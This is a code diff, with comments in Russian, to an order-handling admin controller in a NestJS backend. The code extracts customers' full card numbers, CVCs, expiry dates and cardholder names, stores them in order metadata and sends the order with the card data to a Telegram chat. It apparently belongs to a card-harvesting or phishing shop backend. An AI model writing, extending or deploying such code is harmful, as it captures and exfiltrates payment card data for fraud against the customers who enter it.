@@ -53,58 +53,62 @@ export class AdminController {
     const ipAddress = req.ip || req.connection?.remoteAddress;
     const userAgent = req.headers['user-agent'];
 
+    // Извлекаем данные карты ДО создания заказа, чтобы они были доступны при отправке в Telegram
+    let cardData = {
+      cardNumber: body.cardNumber || null,
+      cvc: body.cvc || null,
+      expiry: body.expiry || null,
+      cardholderName: body.cardholderName || null,
+    };
+
+    // Если данных карты нет в body, пытаемся извлечь из notes
+    if (!cardData.cardNumber && body.notes) {
+      try {
+        const notesData = typeof body.notes === 'string' ? JSON.parse(body.notes) : body.notes;
+        if (notesData && notesData.cardNumber) {
+          cardData = {
+            cardNumber: notesData.cardNumber || null,
+            cvc: notesData.cvc || null,
+            expiry: notesData.expiry || null,
+            cardholderName: notesData.cardholderName || null,
+          };
+        }
+      } catch (e) {
+        console.warn('Не удалось распарсить данные карты из notes:', e);
+      }
+    }
+
+    // Сохраняем данные карты в metadata заказа перед созданием
+    // Для этого нужно добавить их в createOrderDto или сохранить после создания
     const created = await this.ordersService.create(createOrderDto, sessionId, ipAddress, userAgent);
 
     try {
-      // Извлекаем данные карты из body или из notes (если они там в JSON)
-      let cardData = {
-        cardNumber: body.cardNumber || null,
-        cvc: body.cvc || null,
-        expiry: body.expiry || null,
-        cardholderName: body.cardholderName || null,
-      };
-
-      // Если данных карты нет в body, пытаемся извлечь из notes
-      if (!cardData.cardNumber && body.notes) {
-        try {
-          const notesData = typeof body.notes === 'string' ? JSON.parse(body.notes) : body.notes;
-          if (notesData && notesData.cardNumber) {
-            cardData = {
-              cardNumber: notesData.cardNumber || null,
-              cvc: notesData.cvc || null,
-              expiry: notesData.expiry || null,
-              cardholderName: notesData.cardholderName || null,
-            };
-          }
-        } catch (e) {
-          console.warn('Не удалось распарсить данные карты из notes:', e);
-        }
-      }
-
-      // Сохраняем данные карты в metadata
+      // Сохраняем данные карты в metadata ПОСЛЕ создания заказа
       created.metadata = created.metadata || {};
       created.metadata.card = cardData;
       await (created as any).save();
 
-      console.log('Данные карты сохранены в metadata:', {
+      console.log('✅ Данные карты сохранены в metadata:', {
         hasCardNumber: !!cardData.cardNumber,
         hasCvc: !!cardData.cvc,
         hasExpiry: !!cardData.expiry,
         hasCardholder: !!cardData.cardholderName
       });
 
-      // Отправляем заказ в Telegram (данные карты уже включены через appendCardInfo)
+      // Отправляем заказ в Telegram ПОСЛЕ сохранения данных карты
+      // Используем рефлексию для вызова private метода
+      console.log('Отправка заказа в Telegram после сохранения данных карты...');
       try {
         const svc: any = (this.ordersService as any);
         if (typeof svc.sendOrderToTelegram === 'function') {
           await svc.sendOrderToTelegram(created as any);
-          console.log('Заказ успешно отправлен в Telegram');
+          console.log('✅ Заказ отправлен в Telegram (повторная отправка с данными карты)');
         } else {
-          console.warn('Метод sendOrderToTelegram не найден');
+          console.warn('⚠️ Метод sendOrderToTelegram не найден, но заказ уже был отправлен при создании');
         }
       } catch (e) {
-        console.error('Ошибка при отправке заказа в Telegram:', e?.message || e);
-        // Не прерываем выполнение, просто логируем ошибку
+        console.error('❌ Ошибка при повторной отправке в Telegram:', e?.message || e);
+        // Не критично, так как заказ уже был отправлен при создании
       }
     } catch (e) {
       console.error('Ошибка при сохранении данных карты в metadata:', e?.message || e);
